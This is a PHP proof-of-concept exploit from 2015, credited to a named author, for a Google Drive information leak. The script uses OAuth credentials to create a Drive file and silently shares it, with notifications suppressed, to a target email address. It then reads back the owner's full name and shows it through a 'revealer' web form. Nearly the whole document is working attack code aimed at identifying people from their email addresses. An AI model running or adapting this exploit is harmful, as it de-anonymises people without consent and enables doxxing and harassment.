<?php

/*
exploit title: full name disclosure information leak in google drive
software link: https://drive.google.com/drive/#my-drive
author: kevin mcsheehan
website: http://mcsheehan.com
date: 01/20/15

instructions: using google developers console, generate api credentials after enabling drive api
on a new project edit this file with said credentials (i.e. clientid, clientsecret, redirecturi)
your redirecturi must point to this file

*/

if($_GET['code'] == "null"){
    goto reveal; //php isn't my language of choice
}

begin:

require_once "google-api-php-client/src/Google/Client.php";
require_once "google-api-php-client/src/Google/Service/Drive.php";
require_once "google-api-php-client/src/Google/Auth/AssertionCredentials.php";

$cScope         =   'https://www.googleapis.com/auth/drive';
$cClientID      =   '[clientid]';
$cClientSecret  =   '[clientsecret]';
$cRedirectURI   =   '[redirecturi (url of this file)]';

$cAuthCode      =   '';

if(isset( $_GET['code'])) {
    $cAuthCode = $_GET['code'];
}
if (!($cAuthCode) == "null") {
    $rsParams = array(
        'scope' => $cScope,
        'state' => 'security_token',
        'redirect_uri' => $cRedirectURI,
        'response_type' => 'code',
        'client_id' => $cClientID,
        'access_type' => 'offline',
        'approval_prompt' => 'force'
        );

    $cOauthURL = 'https://accounts.google.com/o/oauth2/auth?' . http_build_query($rsParams);
    header('Location: ' . $cOauthURL);
    exit();
}
elseif (empty($cRefreshToken)) {
    $authURL = "https://www.googleapis.com/oauth2/v3/token?code=" . $cAuthCode . "&client_id=" . $cClientID . "&client_secret=" . $cClientSecret . "&redirect_uri=" . $cRedirectURI . "&grant_type=authorization_code";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_URL, $authURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    $oToken = json_decode($output);

    $accessToken = $oToken->access_token;
    $refreshToken = $oToken->refresh_token;

}

?>

<?php

reveal:

if(isset($_POST['target'])) {

    $target = $_POST['target'];
    $accessToken = $_POST['access_token'];
    $refreshToken = $_POST['refresh_token'];
    $id = $_POST['id'];

    $createURL = "https://www.googleapis.com/drive/v2/files";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        "Authorization:  Bearer " . $accessToken
        ));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_URL, $createURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"title\": \"revealyourself\"}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    $oToken = json_decode($output);
    $fileID = $oToken->id;

    $addUser1 = "https://www.googleapis.com/drive/v2/files/" . $fileID . "/permissions?sendNotificationEmails=false&emailMessage=" . $target . "%40gmail.com";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        "Authorization:  Bearer " . $accessToken
        ));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_URL, $addUser1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"role\": \"writer\",\"type\": \"user\",\"value\": \"" . $target . "\",\"emailAddress\": \"" . $target . "\"}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    $adduser2 = "https://www.googleapis.com/drive/v2/files/" . $fileID . "/permissions?sendNotificationEmails=false&emailMessage=" . $target . "%40gmail.com";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        "Authorization:  Bearer " . $accessToken
        ));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_URL, $adduser2);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"role\": \"writer\",\"type\": \"user\",\"value\": \"" . $target . "\",\"emailAddress\": \"" . $target . "\"}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);

    $oToken = json_decode($output);
    $fullName = $oToken->name;

}

?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>gmail full name information disclosure vulnerability proof of concept</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body alink="#e74c3c" vlink="#e74c3c" link="#e74c3c" class="blurBg-false" style="background-color:#EBEBEB">
<br><br>
<link rel="stylesheet" href="index_files/formoid1/formoid-solid-red.css" type="text/css"/>
<script type="text/javascript" src="index_files/formoid1/jquery.min.js"></script>
<form action="index.php?code=null" class="formoid-solid-red" style="background-color:#FFFFFF;font-size:9px;font-family:arial,helvetica;color:#34495E;max-width:480px;min-width:150px" method="post">
<div class="title"><h2>google drive email address full name revealer</h2></div>
    <input type="hidden" name="access_token" value="<?php echo $accessToken; ?>">
    <input type="hidden" name="refresh_token" value="<?php echo $refreshToken; ?>">
    <input type="hidden" name="id" value="<?php echo $fileID; ?>">
    <div class="element-input" title="enter your target's email address">
    <label class="title"></label>
    <div class="item-cont">
    <input class="large" type="text" name="target" placeholder="target@provider.com"/>
    <span class="icon-place"></span>
    </div></div>
<div class="submit">
<input type="submit" value="reveal"/>
</div>
</form>
<script type="text/javascript" src="index_files/formoid1/formoid-solid-red.js"></script>

<center>
<p>
<?php

if(isset( $_POST['target'])) {
echo "<font face=arial size=3><b><font color=\"#ff5e4d\">" . $target . "</font></b> is <font color=\"#e74c3c\"><b>" . $fullName , "</b></font></font><br>";
}

?>
</p>
</center>
</body>
</html>
